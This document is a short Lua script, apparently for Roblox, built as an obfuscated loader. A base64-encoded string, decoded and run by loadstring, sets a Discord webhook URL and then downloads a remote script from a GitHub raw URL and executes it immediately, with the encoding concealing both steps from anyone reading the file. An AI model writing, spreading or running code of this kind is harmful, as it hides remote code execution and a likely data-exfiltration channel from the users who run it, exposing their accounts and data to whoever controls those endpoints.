
 -- Obfuscated script
 local encodedScript = "VXNlcm5hbWUgPSAiQXNzIG9ic2Z1c2NhdGUiCldlYmhvb2sgPSAiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMwNTg3NzQ0NzI3ODk4NTI0Ni9acWU5RjcyLXBmS2NNSV9JMFhocWhZU1UtZGdtQ0hLZDFzaWhzUjVvSWVNeElPWW1DbG9sbmlnZ2VybGlBNVllV09kcHdZVHVyV28iCgpsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1NoYXJTY3JpcHQvRklTQ0gvcmVmcy9oZWFkcy9tYWluL1Byb3RlY3RlZF9GaXNjaC50eHQiLCB0cnVlKSkoKQ=="

 -- Decode function
 local function decode(str)
     local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
     str = string.gsub(str, '[^'..b..'=]', '')
     return (str:gsub('.', function(x)
         if (x == '=') then return '' end
         local r,f='',(b:find(x)-1)
         for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
         return r;
     end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
         if (#x ~= 8) then return '' end
         local c=0
         for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
         return string.char(c)
     end))
 end

 -- Run the decoded script
 loadstring(decode(encodedScript))()
 